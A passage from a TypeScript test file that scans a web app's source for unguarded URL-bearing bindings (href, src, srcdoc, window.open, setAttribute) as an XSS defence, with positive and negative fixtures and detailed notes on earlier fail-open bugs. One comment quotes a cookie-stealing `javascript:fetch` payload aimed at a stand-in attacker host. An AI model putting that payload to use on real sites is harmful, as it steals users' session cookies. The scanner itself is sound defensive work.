/**
 * Tree-wide scanner for URL-bearing attribute bindings.
 *
 * MOTIVATION. Fixing the two `href=${...}` bindings that an audit happened to
 * trace is a checklist. A checklist does not stop the next binding someone adds.
 * When the hazard is open-set, the fix has to be a chokepoint: this scanner
 * fails the build for any dynamic binding of a URL-bearing attribute (see
 * URL_ATTRS), any assignment to a URL-bearing property (URL_PROPS), any
 * setAttribute whose name it cannot read, any imperative navigation with a
 * non-literal URL, and any URL property set through `Object.assign` -- unless
 * the line is explicitly allow-listed here with a reason.
 *
 * To add a new URL-bearing binding you must either route it through
 * `safeHref()` or add an entry below justifying why it is safe by construction.
 *
 * WHAT IT STILL DOES NOT SEE, so that the boundary is on the record rather than
 * implied by the rules: CSS `url()` in a styles block, lit's `unsafeStatic`
 * and `unsafeHTML`, a URL reaching an attribute through a spread
 * (`html\`<a ...${props}>\``), and `el.data = url` on an <object> (see the note
 * on URL_PROPS). Those are tracked separately, not closed here.
 *
 * SCOPE NOTE. The addendum to this task asked for this rule to be added to
 * `web/src/util/markdown.test.ts`, which has a tree-wide `BANNED_SINKS`
 * scanner. That file does not exist at this commit -- it lives only on the
 * `markdown-sanitize` branch, which has not merged. Verified: `BANNED_SINKS`
 * has zero occurrences in this tree. So this rule ships as its own
 * self-contained file, which also means it lands independently of that branch.
 * Folding the two scanners together is merge-time cleanup.
 *
 * (An earlier version of this note also said "the only other `*.test.ts` under
 * `web/` is `src/utils/task-ready.test.ts`". That was true when written and is
 * not now -- there are four. It is deleted rather than updated: a count of
 * sibling test files is not this file's business to track, and a fact nobody
 * maintains is how the sentence became false. scripts/run-tests.mjs discovers
 * them, which is the only place the set needs to be known.)
 */
import { existsSync, readdirSync, readFileSync, statSync } from 'node:fs';
import { dirname, join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { assert } from './assertions.js';

// ── the rules ────────────────────────────────────────────────────────────────

interface Rule {
  readonly name: string;
  readonly pattern: RegExp;
}

/**
 * URL-bearing HTML ATTRIBUTES. Each of these navigates, fetches, or executes
 * from a string the markup supplies, so each is a place a `javascript:` or
 * `data:` value reaches a sink:
 *
 *   href, src, xlink:href  the original two, plus the SVG form
 *   srcdoc                 <iframe srcdoc> is a full HTML document, inline
 *   formaction             overrides a form's action from the submit button
 *   action                 <form action="javascript:...">
 *   ping                   fires a POST to an arbitrary URL on click
 *   srcset                 a list of URLs; the browser picks one
 *   poster                 <video poster>
 *   data                   <object data="..."> loads and can execute
 *
 * Attribute names are matched case-insensitively because HTML is
 * case-insensitive and Lit passes the name through.
 */
const URL_ATTRS = [
  'href',
  'src',
  'xlink:href',
  'srcdoc',
  'formaction',
  'action',
  'ping',
  'srcset',
  'poster',
  'data',
] as const;

/**
 * The subset safe to match as JS PROPERTY names.
 *
 * `action`, `ping` and `data` are omitted deliberately: as identifiers they are
 * overwhelmingly ordinary application state (`this.data =`, `{ action: 'save' }`)
 * and including them would produce an allow-list of dozens of unrelated lines,
 * which is how a scanner stops being read. As ATTRIBUTES they stay in
 * URL_ATTRS above, where they are unambiguous.
 *
 * This is a precision/recall trade made explicitly rather than by omission:
 * `el.data = url` on an <object> is a real sink and this will not catch it.
 */
const URL_PROPS = ['href', 'src', 'srcdoc', 'formAction', 'srcset', 'poster'] as const;

const ATTR_ALT = URL_ATTRS.join('|').replace(/:/g, '\\:');
const PROP_ALT = URL_PROPS.join('|');

const RULES: readonly Rule[] = [
  // Lit template binding, unquoted: <a href=${expr}> / <img src=${expr}>
  {
    name: 'dynamic URL attribute binding',
    pattern: new RegExp(`\\b(?:${ATTR_ALT})\\s*=\\s*\\$\\{`, 'i'),
  },
  // The same binding with quotes around it: href="${expr}". Lit accepts this
  // form and it is what most people write from muscle memory, but the unquoted
  // pattern above does not match it, so the scanner had a recall hole wide
  // enough to drive the original defect straight back through.
  {
    name: 'dynamic URL attribute binding (quoted)',
    pattern: new RegExp(`\\b(?:${ATTR_ALT})\\s*=\\s*["'\`][^"'\`]*\\$\\{`, 'i'),
  },
  // Imperative DOM assignment: el.href = expr
  {
    name: 'dynamic URL property assignment',
    pattern: new RegExp(`\\.(?:${PROP_ALT})\\s*=\\s*(?!=)`),
  },
  // SVG's SVGAnimatedString: use.href.baseVal = expr. The rule above does not
  // match it, because `.href` is followed by `.baseVal` rather than `=`. This
  // is the property-side counterpart of the xlink:href attribute support, which
  // review noted was present on the attribute rules and absent here.
  { name: 'dynamic SVG href.baseVal assignment', pattern: /\.(?:href|src)\.baseVal\s*=\s*(?!=)/ },
  // Imperative attribute write: el.setAttribute('href', expr). This bypasses
  // both patterns above entirely and is the standard way to set an attribute
  // outside a template.
  {
    name: 'URL attribute written via setAttribute',
    pattern: new RegExp(`\\.setAttribute(?:NS)?\\s*\\([^)]*["'\`](?:${ATTR_ALT})["'\`]`, 'i'),
  },
  // setAttribute with a COMPUTED name. Whatever the name turns out to be, this
  // scanner cannot read it, so the rule above is blind to the call -- and
  // `el.setAttribute(name, value)` with name from a loop over a props object is
  // an ordinary way to write code. Banned outright: use a literal name, or
  // allow-list the line with a reason.
  //
  // A static template literal (`'href'` written with backticks) counts as a
  // literal; one with a `${` in it does not, because its value is computed.
  {
    name: 'setAttribute with a computed attribute name',
    pattern: /\.setAttribute\s*\(\s*(?!['"]|`[^`$]*`)/,
  },
  {
    name: 'setAttributeNS with a computed attribute name',
    pattern: /\.setAttributeNS\s*\([^,]*,\s*(?!['"]|`[^`$]*`)/,
  },
  // Imperative navigation. These take a URL as an argument rather than
  // assigning one to a property, so none of the patterns above sees them, and
  // `window.open('javascript:...')` executes in the opener's origin.
  {
    name: 'imperative navigation with a non-literal URL',
    pattern: /\b(?:window\.open|location\.assign|location\.replace|open)\s*\(\s*(?!['"`)])/,
  },
];

/**
 * `Object.assign(el, { href: expr })` is a MULTI-LINE shape, so no line regex
 * can see it -- and it is already the house style in this tree for building a
 * detached element (ft-app.ts:766, ft-toolbar.ts:701,
 * dependency/ft-dependency-view.ts:1378, all of them building <sl-alert>). A
 * scanner that fails the build for `el.href = url` and waves through
 * `Object.assign(el, { href: url })` is enforcing a coding style, not a
 * property.
 *
 * Handled as a whole-text scan: find each `Object.assign(`, balance its
 * argument list, and report any URL-bearing property key inside it whose value
 * is not a string literal. Reported at the line of the KEY, so the allow-list
 * entry is the line a reviewer would look at.
 */
function scanObjectAssign(file: string, text: string): Finding[] {
  const findings: Finding[] = [];
  const code = blankNonCode(text);
  const propRe = new RegExp(`(?:^|[{,\\s])(${PROP_ALT})\\s*:\\s*(.*)$`);
  const marker = 'Object.assign(';

  for (let at = code.indexOf(marker); at >= 0; at = code.indexOf(marker, at + 1)) {
    // Balance from the opening paren to find the extent of the call.
    let depth = 0;
    let end = code.length;
    for (let i = at + marker.length - 1; i < code.length; i++) {
      if (code[i] === '(') depth++;
      else if (code[i] === ')') {
        depth--;
        if (depth === 0) {
          end = i;
          break;
        }
      }
    }

    const lineOfOffset = (o: number) => code.slice(0, o).split('\n').length;
    const firstLine = lineOfOffset(at);
    const lines = text.split('\n');
    const lastLine = lineOfOffset(end);

    for (let ln = firstLine; ln <= lastLine && ln <= lines.length; ln++) {
      const m = propRe.exec(blankNonCode(lines[ln - 1]!));
      if (!m) continue;
      // A blanked string literal is `''`/`""` with spaces inside: static, safe.
      if (/^(['"`])\s*\1\s*,?\s*$/.test(m[2]!.trim())) continue;
      findings.push({
        file,
        lineNo: ln,
        line: lines[ln - 1]!.trim(),
        rule: `URL property set via Object.assign (${m[1]})`,
      });
    }
  }
  return findings;
}

// ── the allow-list ───────────────────────────────────────────────────────────

interface Allowed {
  /** Path relative to web/src. */
  readonly file: string;
  /** Exact trimmed source line that is permitted. */
  readonly line: string;
  /** Why this binding cannot carry an attacker-controlled scheme. */
  readonly reason: string;
  /**
   * If set, TWO things must hold for the interpolated identifier on THIS line:
   * some assignment in the innermost enclosing block initialises it from
   * `safeHref(...)` and nothing else, and NO assignment anywhere in the file
   * assigns it from anything else.
   *
   * Four successively tighter versions, each fixing a measured fail-open:
   *
   *   1. "the file imports safeHref somewhere" -- satisfied by a file that
   *      guards one binding and leaves the next one bare.
   *   2. "some line in the enclosing block matches `id = safeHref(`" -- where
   *      the block was the whole class, so a guarded method laundered a bare
   *      sibling, and where the match was a prefix, so
   *      `safeHref(url) || url` passed.
   *   3. the same check with the block narrowed to the innermost one and the
   *      whole initialiser matched instead of its prefix. Still EXISTENTIAL:
   *      it asks whether the guard appears, never whether it survives, so
   *      `let href = safeHref(url); href = url;` passed with exit 0.
   *   4. what is checked now -- (3) as the positive arm, plus a UNIVERSAL
   *      negative arm over the whole file. Note that the two arms want
   *      opposite scopes and that this is not an inconsistency; see the
   *      direction note on enclosingBlock.
   */
  readonly viaSafeHref?: boolean;
}

const ALLOWED: readonly Allowed[] = [
  {
    file: 'components/inspector/ft-inspector-code.ts',
    line: 'return html`<a class="pr-link" href=${href} target="_blank" rel="noopener">${id}</a>`;',
    reason: 'href comes from safeHref(), which allow-lists http/https.',
    viaSafeHref: true,
  },
  {
    file: 'components/inspector/ft-inspector-meta.ts',
    line: 'return html`<a href=${href} target="_blank" rel="noopener" class="external-source-link">',
    reason: 'href comes from safeHref(), which allow-lists http/https.',
    viaSafeHref: true,
  },
  {
    file: 'components/ft-toolbar.ts',
    line: '<a href=${url} target="_blank" rel="noopener" class="external-link" title="View on GitHub">',
    reason:
      'url is built from the literal prefix https://github.com/ plus a remoteId ' +
      'already matched against GITHUB_REPO_RE, so the scheme is not attacker-controlled.',
  },
  {
    file: 'components/ft-toolbar.ts',
    line: 'a.href = url;',
    reason: 'url is a locally minted blob: URL from URL.createObjectURL, for a download.',
  },
];

// ── scanning ─────────────────────────────────────────────────────────────────

/**
 * Resolve web/src. This test is compiled into .tmp-test/ before running, so
 * import.meta.url points at the build output rather than at the sources. Walk up
 * to the directory holding package.json and take src/ from there.
 */
function sourceRoot(): string {
  let dir = fileURLToPath(new URL('.', import.meta.url));
  while (!existsSync(join(dir, 'package.json'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate web/package.json from ' + import.meta.url);
    dir = parent;
  }
  return join(dir, 'src');
}

const SRC = sourceRoot();

/**
 * Files this scanner is responsible for.
 *
 * NOT just `.ts`. The previous filter was `entry.endsWith('.ts')`, which makes
 * the scanner blind to `.tsx`, `.mts`, `.cts` and any `.js` that lands in src/ --
 * a `.tsx` component with `href=${raw}` in it is simply not looked at, and no
 * directory binding fixes that, because the directory would still be reached.
 * The project already anticipates the wider family: web/scripts/run-tests.mjs
 * strips `\.[cm]?[jt]sx?$` when it canonicalises test names. Matching that here
 * means the scanner's notion of "a source file" and the runner's agree.
 *
 * MEASURED on this tree: widening changes nothing (52 files either way). It is
 * a future-proofing change, and it is recorded as one rather than as a fix.
 */
const SOURCE_EXT = /\.[cm]?[jt]sx?$/;
const TEST_FILE = /\.test\.[cm]?[jt]sx?$/;

function sourceFiles(dir: string, out: string[] = []): string[] {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) {
      sourceFiles(full, out);
    } else if (SOURCE_EXT.test(entry) && !TEST_FILE.test(entry)) {
      out.push(full);
    }
  }
  return out;
}

/**
 * An INDEPENDENT enumeration of every directory under `root`, used to bind the
 * scanner's walk to the shape of the tree.
 *
 * WHY IT EXISTS, AND WHY IT IS NOT sourceFiles(). The walk's anti-vacuity floor
 * used to be `files.length >= 40` plus three named witness files. That is a
 * COUNT, and a count does not constrain identity: a mutant that skipped
 * store/, gen/ and kanban/ -- 11 of 52 files -- left 41 files, cleared the
 * floor of 40, still reached all three witnesses, and was measured GREEN with a
 * real unguarded `href=${raw}` planted in the skipped store/. The floor admits
 * directory loss by construction, because 52 is comfortably above 40.
 *
 * So the binding is on DIRECTORIES REACHED and on the per-directory file count,
 * not on a total. And the expectation is computed by a deliberately different
 * traversal -- an explicit stack here, recursion there -- so that a recursion
 * bug in one is not silently reproduced in the other. Two walks can still be
 * wrong in the same way; the floor on this walk's own output is the backstop
 * for that, and it is a backstop, not the check.
 */
function directoryCensus(root: string): Map<string, number> {
  const census = new Map<string, number>();
  const stack: string[] = [root];
  while (stack.length > 0) {
    const dir = stack.pop()!;
    const rel = relative(root, dir) || '.';
    let count = 0;
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      if (entry.isDirectory()) stack.push(join(dir, entry.name));
      else if (SOURCE_EXT.test(entry.name) && !TEST_FILE.test(entry.name)) count++;
    }
    census.set(rel, count);
  }
  return census;
}

interface Finding {
  readonly file: string;
  readonly lineNo: number;
  readonly line: string;
  readonly rule: string;
}

function scanText(file: string, text: string): Finding[] {
  const findings: Finding[] = [];
  text.split('\n').forEach((line, i) => {
    for (const rule of RULES) {
      if (rule.pattern.test(line)) {
        findings.push({ file, lineNo: i + 1, line: line.trim(), rule: rule.name });
      }
    }
  });
  findings.push(...scanObjectAssign(file, text));
  return findings;
}

// ── assertions ───────────────────────────────────────────────────────────────

/**
 * Blanks out `//` and block comments, and the contents of ordinary quoted
 * strings, so brace counting and guard matching see code rather than prose.
 *
 * Characters are replaced with spaces rather than deleted, so every line keeps
 * its length and every line keeps its index -- callers index back into the
 * original text by line number. **Call it on whole file text, not line by
 * line**: a per-line call cannot see that a line is inside a `/* *\/` docblock,
 * which used to make the "a commented-out guard must not count" assertions pass
 * for the wrong reason. See testGuardTracing.
 *
 * TEMPLATE LITERALS ARE TRACKED, and this is a fix rather than a refinement.
 * The previous version left them entirely alone, documenting the residual risk
 * as "a lone `{` or `}` in template HTML text. Nothing in this tree has one."
 * The likelier trigger was not a brace, it was an APOSTROPHE: `don't` in
 * template HTML text opened a single-quote blanking run, and if a multi-line
 * `${` interpolation followed on that line the opening brace was blanked while
 * its closing brace on a later line was not. Review measured depth -1 against a
 * raw depth of 0 for exactly that shape -- which makes enclosingBlock select the
 * wrong opening brace and WIDEN the block, the precise fail-open direction that
 * 42d62a4 exists to close.
 *
 * So the state machine distinguishes template TEXT (where `'`, `"` and `/` are
 * ordinary characters and only `\`, `` ` `` and `${` mean anything) from the
 * code inside `${...}` (where the normal rules resume, recursively).
 *
 * STILL NOT HANDLED, named rather than implied: regular-expression literals.
 * `/[a-z'"]/` opens a string run at the quote, because telling a regex literal
 * from a division needs a real lexer. Measured across web/src: one file is
 * brace-unbalanced under this function for that reason and it is this file,
 * which sourceFiles() excludes and enclosingBlock is never called on. The
 * backstop for the general case is assertBraceBalanced below -- an unbalanced
 * region is now a loud error, not a silent mis-parse.
 */
function blankNonCode(text: string, blankTemplateText = false): string {
  const out = text.split('');
  const n = out.length;

  // Context stack. `template` = inside a template literal's text; `interp` =
  // inside a `${...}` within one, recording the brace depth at its opening so
  // the matching `}` can be recognised.
  type Ctx = { readonly kind: 'template' } | { readonly kind: 'interp'; readonly depth: number };
  const stack: Ctx[] = [];
  let depth = 0;
  let i = 0;

  while (i < n) {
    const c = text[i]!;
    const next = text[i + 1];
    const top = stack[stack.length - 1];

    // ── template literal TEXT ──────────────────────────────────────────────
    if (top?.kind === 'template') {
      if (c === '\\') {
        i += 2;
      } else if (c === '`') {
        stack.pop();
        i++;
      } else if (c === '$' && next === '{') {
        stack.push({ kind: 'interp', depth });
        depth++;
        i += 2;
      } else {
        if (blankTemplateText && c !== '\n') out[i] = ' ';
        i++;
      }
      continue;
    }

    // ── code ───────────────────────────────────────────────────────────────
    if (c === '/' && next === '/') {
      while (i < n && text[i] !== '\n') out[i++] = ' ';
    } else if (c === '/' && next === '*') {
      out[i++] = ' ';
      out[i++] = ' ';
      while (i < n && !(text[i] === '*' && text[i + 1] === '/')) {
        if (text[i] !== '\n') out[i] = ' ';
        i++;
      }
      if (i < n) {
        out[i++] = ' ';
        out[i++] = ' ';
      }
    } else if (c === '"' || c === "'") {
      i++;
      while (i < n && text[i] !== c && text[i] !== '\n') {
        if (text[i] === '\\') out[i++] = ' ';
        out[i] = ' ';
        i++;
      }
      i++;
    } else if (c === '`') {
      stack.push({ kind: 'template' });
      i++;
    } else if (c === '{') {
      depth++;
      i++;
    } else if (c === '}') {
      depth--;
      if (top?.kind === 'interp' && top.depth === depth) stack.pop();
      i++;
    } else {
      i++;
    }
  }
  return out.join('');
}

/**
 * blankNonCode, plus the TEXT of template literals -- everything outside a
 * `${...}` -- so that what is left is only executable code.
 *
 * The guard-tracing arms need this and the tree scan must not have it. RULES
 * matches `href=${...}` inside template HTML, so blanking that text would blind
 * the scanner completely. But for deciding whether an identifier is ASSIGNED,
 * template text is pure noise, and worse than noise: `<a href=${href}>` matches
 * an `href = ...` assignment regex exactly, so the universal arm read every
 * guarded binding in the tree as its own defeat. Measured: the "guard only"
 * fixture came back `defeated`.
 *
 * `${` and its matching `}` are left in place so brace depth still balances.
 */
function blankToCode(text: string): string {
  return blankNonCode(text, true);
}

/**
 * Hard-fails if blanked code is not brace-balanced.
 *
 * A pre-pass that silently mis-parses makes every assertion downstream of it
 * meaningless, and it does so quietly: enclosingBlock would pick the wrong
 * opening brace and hand back a region that is not the block it names. There is
 * no safe direction for that error -- a widened region lets a guarded sibling
 * launder a bare binding, and a narrowed one fails a binding that is fine -- so
 * it is refused rather than approximated.
 */
function assertBraceBalanced(code: string, what: string): void {
  let depth = 0;
  let line = 1;
  for (let i = 0; i < code.length; i++) {
    const c = code[i];
    if (c === '\n') line++;
    else if (c === '{') depth++;
    else if (c === '}') {
      depth--;
      if (depth < 0) {
        throw new Error(
          `blankNonCode produced unbalanced braces for ${what}: a closing brace at line ` +
            `${line} has no opener. The blanker has mis-identified a region, so any block ` +
            'scope computed from it is not the block it claims to be. Refusing to proceed ' +
            'rather than approving a binding on a mis-parsed scope.',
        );
      }
    }
  }
  if (depth !== 0) {
    throw new Error(
      `blankNonCode produced unbalanced braces for ${what}: ${depth} unclosed brace(s). ` +
        'See the note on regular-expression literals in blankNonCode. Refusing to compute ' +
        'a block scope from a mis-parsed file.',
    );
  }
}

/** Escapes a JS identifier for embedding in a RegExp. `$` is legal in both. */
function reEscape(id: string): string {
  return id.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/**
 * The innermost block enclosing a 1-based line number, found by brace depth.
 *
 * WHAT THIS REPLACED, AND WHY. The previous version took "the last preceding
 * line that starts at column 0 and opens a block" to "the first following line
 * that is a closing brace at column 0", and its comment said: "for a line inside
 * a class it widens to the whole class. Widening is the safe direction -- it can
 * only make the check more permissive than intended, never wrongly fail a
 * guarded binding".
 *
 * The first sentence was a correct measurement. The second was the wrong
 * conclusion drawn from it. For a SECURITY check, more permissive IS the failure
 * mode: the check exists to prove that THIS binding is guarded, and a scope that
 * spans the whole class lets a guarded sibling method launder a bare one.
 * Measured against the real scanner (deliverable D1(b)): a probe Lit class with
 * a guarded method and an unguarded sibling passed with exit 0; de-guarding the
 * sibling as a control made it fail. "Safe direction" was a sentence written
 * above a measurement that said the opposite.
 *
 * So: walk back from the binding accumulating brace depth and stop at depth -1,
 * which is the brace that opens the innermost enclosing block; then walk forward
 * to its match. For a method in a class that is the method, not the class.
 *
 * NOTE ON DIRECTION, because the reasoning above is only half the picture and
 * reversing it silently would be the next fail-open. Narrow scope is the strict
 * direction for the POSITIVE arm ("some line here guards it"), which is what the
 * paragraph above is about. It is the PERMISSIVE direction for the negative arm
 * ("no line assigns it unguarded"), because a defeating reassignment outside the
 * innermost block is then simply not looked at. The negative arm in
 * testNoUnapprovedBindings therefore runs at FILE scope, not here.
 */
function enclosingBlock(lines: readonly string[], lineNo: number, what = 'input'): readonly string[] {
  const text = lines.join('\n');
  const code = blankToCode(text);
  assertBraceBalanced(code, what);

  // Character offsets of the binding line within `text`.
  let lineStart = 0;
  for (let i = 0; i < lineNo - 1; i++) lineStart += lines[i]!.length + 1;
  const lineEnd = lineStart + (lines[lineNo - 1]?.length ?? 0);

  // Back to the opening brace of the innermost enclosing block.
  let depth = 0;
  let open = 0;
  for (let i = lineStart - 1; i >= 0; i--) {
    const c = code[i];
    if (c === '}') depth++;
    else if (c === '{') {
      if (depth === 0) {
        open = i;
        break;
      }
      depth--;
    }
  }

  // Forward to its match.
  depth = 0;
  let close = code.length;
  for (let i = lineEnd; i < code.length; i++) {
    const c = code[i];
    if (c === '{') depth++;
    else if (c === '}') {
      if (depth === 0) {
        close = i;
        break;
      }
      depth--;
    }
  }

  return text.slice(open, close + 1).split('\n');
}

/**
 * Whether `line` assigns `id` from safeHref() AND FROM NOTHING ELSE.
 *
 * WHAT THIS REPLACED, AND WHY. The check used to be the regex
 * `\b<id>\s*=\s*safeHref\s*\(`, described as "the identifier is assigned from
 * safeHref(...) inside the same enclosing block". It tests only that the
 * initialiser BEGINS with a safeHref call. Measured against the real scanner
 * (deliverable D1(a)): rewriting the guarded site as
 *
 *     const href = safeHref(url) || url || undefined;
 *
 * keeps the scanner green (exit 0, "url-binding-scan: ok") while safe-url.test.ts
 * fails on a live `<a href="javascript:fetch('//attacker/'+document.cookie)">`.
 * The guard is completely defeated and the guard-checker approves it.
 *
 * So the whole initialiser is checked, not its prefix: parentheses are balanced
 * to find the end of the safeHref call, and what follows must be nothing but
 * terminators. `|| url`, `?? url`, `+ suffix`, a ternary -- anything that can
 * reintroduce the unvalidated value -- fails.
 */
function assignsFromSafeHref(line: string, id: string): boolean {
  const m = assignmentLhs(line, id);
  if (!m) return false;

  const rhs = line.slice(m.index + m[0].length);
  const call = /^safeHref\s*\(/.exec(rhs);
  if (!call) return false;

  // Balance the call's parentheses.
  let depth = 0;
  let end = -1;
  for (let i = call[0].length - 1; i < rhs.length; i++) {
    if (rhs[i] === '(') depth++;
    else if (rhs[i] === ')') {
      depth--;
      if (depth === 0) {
        end = i;
        break;
      }
    }
  }
  if (end < 0) return false;

  // Nothing may follow but statement terminators.
  return /^[\s;,)]*$/.test(rhs.slice(end + 1));
}

/**
 * Matches an assignment to `id` on `line`, whatever it assigns.
 *
 * Not `.href =` (a property write on some other object), not `==`/`===`/`=>`.
 * `id` is escaped because a legal JS identifier may contain `$`, which is an
 * anchor in a RegExp -- unescaped, `$el` matched nothing and the check passed
 * vacuously.
 */
function assignmentLhs(line: string, id: string): RegExpExecArray | null {
  return new RegExp(`(?:^|[^\\w$.])${reEscape(id)}\\s*=(?![=>])\\s*`).exec(line);
}

/** Whether `line` assigns to `id` at all -- the universal arm's trigger. */
function isAssignmentTo(line: string, id: string): boolean {
  return assignmentLhs(line, id) !== null;
}

/**
 * Every line in `blankedLines` that assigns `id` from something other than
 * safeHref(). Empty means the guard is not defeated anywhere in the region.
 *
 * This is the universal half of the viaSafeHref check and it is the half that
 * was missing. The old check was `block.some(assignsFromSafeHref)`: EXISTENTIAL.
 * It asked whether the guard appears, never whether it survives. Round 3 closed
 * the single-line spelling of the defeat (`safeHref(url) || url`) inside
 * assignsFromSafeHref and left every multi-statement spelling open --
 *
 *     let href = safeHref(url);   // satisfies the existential
 *     href = url;                 // and then throws it away
 *
 * -- which was measured green, exit 0, on a probe file (deliverable 0).
 */
function defeatingAssignments(
  blankedLines: readonly string[],
  id: string,
): readonly { readonly lineNo: number; readonly text: string }[] {
  const out: { lineNo: number; text: string }[] = [];
  blankedLines.forEach((line, i) => {
    if (isAssignmentTo(line, id) && !assignsFromSafeHref(line, id)) {
      out.push({ lineNo: i + 1, text: line.trim() });
    }
  });
  return out;
}

/**
 * The identifier interpolated into a binding, e.g. `href` from
 * `<a href=${href} ...>`. Returns undefined for anything that is not a bare
 * identifier -- a call, a member expression, a template -- because those cannot
 * be traced back to an assignment by text matching and must not be silently
 * treated as guarded.
 */
function interpolatedIdentifier(line: string): string | undefined {
  const m = /\b(?:href|src|xlink:href)\s*=\s*["'`]?\s*\$\{\s*([A-Za-z_$][\w$]*)\s*\}/.exec(line);
  return m?.[1];
}

/**
 * MUST 3e: a detection pattern with no fixture proving it fires is itself the
 * defect it is meant to catch. These fixtures run through the same matcher the
 * tree scan uses.
 */
function testPositiveFixtures(): void {
  const shouldFire: ReadonlyArray<readonly [string, string]> = [
    ['plain lit href binding', 'return html`<a href=${this.description}>x</a>`;'],
    ['plain lit src binding', 'return html`<img src=${task.avatarUrl}>`;'],
    ['spaced href binding', 'html`<a href = ${raw}>x</a>`'],
    ['href binding wrapped in a call', 'html`<a href=${safeHref(raw)}>x</a>`'],
    ['imperative href assignment', 'anchor.href = attackerControlled;'],
    ['imperative src assignment', 'img.src = attackerControlled;'],
    ['iframe src binding', 'html`<iframe src=${embedUrl}></iframe>`'],
    // Recall gaps found by review. Each of these shipped past the scanner.
    ['double-quoted href binding', 'html`<a href="${raw}">x</a>`'],
    ['single-quoted src binding', "html`<img src='${raw}'>`"],
    ['quoted href with a prefix', 'html`<a href="${base}/issues/${n}">x</a>`'],
    ['setAttribute href', "anchor.setAttribute('href', attackerControlled);"],
    ['setAttribute src double quoted', 'img.setAttribute("src", attackerControlled);'],
    ['setAttributeNS xlink href', "use.setAttributeNS(XLINK, 'xlink:href', raw);"],
    ['svg xlink href binding', 'svg`<use xlink:href=${raw} />`'],
    // Recall gaps found by audit F-2 / brief B4. Every one of these shipped
    // past the scanner while `el.href = url` failed the build.
    ['iframe srcdoc', 'html`<iframe srcdoc=${raw}></iframe>`'],
    ['form action', 'html`<form action=${raw}></form>`'],
    ['button formaction', 'html`<button formaction=${raw}>go</button>`'],
    ['anchor ping', 'html`<a href="/x" ping=${raw}>x</a>`'],
    ['img srcset', 'html`<img srcset="${raw} 2x">`'],
    ['video poster', 'html`<video poster=${raw}></video>`'],
    ['object data', 'html`<object data=${raw}></object>`'],
    ['uppercase attribute', 'html`<a HREF=${raw}>x</a>`'],
    ['svg href.baseVal', 'use.href.baseVal = raw;'],
    ['srcdoc property', 'frame.srcdoc = raw;'],
    ['setAttribute with a computed name', 'el.setAttribute(name, value);'],
    ['setAttribute with a template name', 'el.setAttribute(`data-${k}`, value);'],
    ['setAttributeNS with a computed name', 'el.setAttributeNS(NS, name, value);'],
    ['window.open', 'window.open(raw, "_blank");'],
    ['location.assign', 'location.assign(raw);'],
    ['location.replace', 'window.location.replace(raw);'],
    ['bare open()', 'open(raw);'],
    // The house-style shape. Multi-line on purpose: a line regex cannot see it,
    // which is why scanObjectAssign exists.
    [
      'Object.assign href',
      ['const a = Object.assign(document.createElement("a"), {', '  href: raw,', '});'].join('\n'),
    ],
    [
      'Object.assign src, several properties',
      [
        'const el = Object.assign(document.createElement("img"), {',
        '  alt: "x",',
        '  src: task.avatarUrl,',
        '});',
      ].join('\n'),
    ],
  ];
  for (const [name, fixture] of shouldFire) {
    const findings = scanText('fixture.ts', fixture);
    assert(findings.length > 0, `positive fixture "${name}" did not fire: ${fixture}`);
  }

  const shouldNotFire: ReadonlyArray<readonly [string, string]> = [
    ['static href', 'html`<a href="/docs">docs</a>`'],
    ['static src', '<script src="/src/index.ts"></script>'],
    ['href comparison', 'if (a.href === b.href) return;'],
    ['unrelated interpolation', 'html`<sl-badge variant=${v}>x</sl-badge>`'],
    ['reading location.href', 'const url = new URL(window.location.href);'],
    // Guards against the new rules over-firing. A data-* attribute that merely
    // contains the substring "href" is not an href.
    ['data attribute containing href', "el.setAttribute('data-href', raw);"],
    ['quoted static href', 'html`<a href="/docs/index">x</a>`'],
    ['getAttribute href', "const h = el.getAttribute('href');"],
    ['removeAttribute href', "el.removeAttribute('href');"],
    // Precision guards for the B4 rules. These decide whether the scanner is
    // readable enough to be read; a scanner nobody reads approves everything.
    ['setAttribute with a literal unrelated name', "el.setAttribute('aria-label', label);"],
    ['ordinary data property', 'this.data = response.items;'],
    ['ordinary action property', "dispatch({ action: 'save' });"],
    ['static window.open', "window.open('https://example.com/docs', '_blank');"],
    ['window.open with no arguments', 'window.open();'],
    ['opening a dialog, not a URL', 'dialog.open = true;'],
    ['static poster', 'html`<video poster="/static/poster.png"></video>`'],
    ['reading href.baseVal', 'const h = use.href.baseVal;'],
    // The three real Object.assign sites in this tree, in shape: none of their
    // properties is URL-bearing, and the scanner must not fire on them or the
    // house style becomes unusable.
    [
      'Object.assign with no URL properties',
      [
        "const alert = Object.assign(document.createElement('sl-alert'), {",
        "  variant: 'danger',",
        '  closable: true,',
        '  duration: 8000,',
        '});',
      ].join('\n'),
    ],
    [
      'Object.assign with a static href',
      ['const a = Object.assign(el, {', "  href: '/docs',", '});'].join('\n'),
    ],
  ];
  for (const [name, fixture] of shouldNotFire) {
    const findings = scanText('fixture.ts', fixture);
    assert(
      findings.length === 0,
      `negative fixture "${name}" fired unexpectedly (${findings.map((f) => f.rule).join(', ')}): ${fixture}`,
    );
  }
}

/**
 * Fixtures for the two guard-tracing mechanisms, which have their own recall
 * and precision to prove. Both replaced a mechanism that measured something
 * true and concluded something false, so both get direct fixtures rather than
 * relying on the tree scan to exercise them.
 */
function testGuardTracing(): void {
  const guarded: ReadonlyArray<readonly [string, string]> = [
    ['plain const', 'const href = safeHref(url);'],
    ['let', 'let href = safeHref(url);'],
    ['reassignment', 'href = safeHref(this.task.remoteUrl);'],
    ['nested parens in the argument', 'const href = safeHref(pick(a, (b) => b.url));'],
    ['trailing whitespace', 'const href = safeHref(url) ;'],
  ];
  for (const [name, fixture] of guarded) {
    assert(assignsFromSafeHref(fixture, 'href'), `guarded fixture "${name}" was rejected: ${fixture}`);
  }

  const notGuarded: ReadonlyArray<readonly [string, string]> = [
    // The D1(a) finding: each of these begins with a safeHref call and each
    // reinstates the unvalidated value. All five used to pass.
    ['|| fallback', 'const href = safeHref(url) || url;'],
    ['?? fallback', 'const href = safeHref(url) ?? url;'],
    ['chained fallback', 'const href = safeHref(url) || url || undefined;'],
    ['concatenation', "const href = safeHref(base) + '/' + path;"],
    ['ternary', 'const href = cond ? safeHref(url) : url;'],
    // Not a guard at all.
    ['bare assignment', 'const href = url;'],
    ['different identifier', 'const hrefRaw = safeHref(url);'],
